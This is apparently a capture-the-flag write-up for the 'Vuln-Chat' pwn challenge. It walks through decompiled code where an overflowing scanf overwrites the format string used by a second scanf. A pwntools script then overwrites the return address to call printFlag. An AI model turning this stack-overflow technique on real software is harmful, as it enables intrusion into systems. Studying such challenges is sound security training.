# Vuln-Chat (pwn)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/ca7cc4f4-1cbb-4342-8a89-999b1652a723)  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/7b3e7dbe-7498-4373-8534-3ca20c68ec08)  

If we run the program we get asked for a username and also get to talk to a genie! Maybe I'll wish for a flag ;)  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/99544e70-6c70-4b75-b5b9-54d5a276ac32)  

Let's look at the binary in ghidra  
```c
void printFlag(void)

{
  system("/bin/cat ./flag.txt");
  puts("Use it wisely");
  return;
}

undefined4 main(void)

{
  undefined answer [20];
  undefined username [20];
  undefined4 fmt;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
                    /* %30s */
  fmt = L'\x73303325';
  local_5 = 0;
  __isoc99_scanf(&fmt,username);
  printf("Welcome %s!\n",username);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",username);
  __isoc99_scanf(&fmt,answer);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```
We can see that the main function is calling `scanf` with a weird hex number, but if we look at the disassembly and interpret it as a sequence of characters then it makes sense.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/2abe6be0-2f64-4c5d-a879-bf545d674ab9)  

So... we're reading 30 bytes into a 20 byte buffer. At least they're not using `gets` :>  
Let's look at the stack layout in ghidra.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/3a984c35-ce72-42f4-bfb4-de53776dbc5f)  
So the username buffer is 0x1d bytes away from the return address. That means that we don't get enough overflow to reach the return address.  
However, we do get enough overflow to overwrite the `fmt` variable, which is used as the format string for the next scanf...  

## Exploitation  
Our plan is to use the initial overflow to overwrite the format string to be able to read a larger amount.  
In the second `scanf` we will be able to write more bytes. This will allow us to overwrite the return address with `printFlag`  

```python
from pwn import *

elf = ELF('./vuln-chat')
p = process('./vuln-chat')

payload1 = b'A'*20
payload1 += b'%99s'

p.sendline(payload1)

payload2 = 0x31*b'B'
payload2 += p32(elf.sym['printFlag'])

p.sendline(payload2)

p.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/4dae9aa8-50e9-4290-b6d1-871afcda8dee)




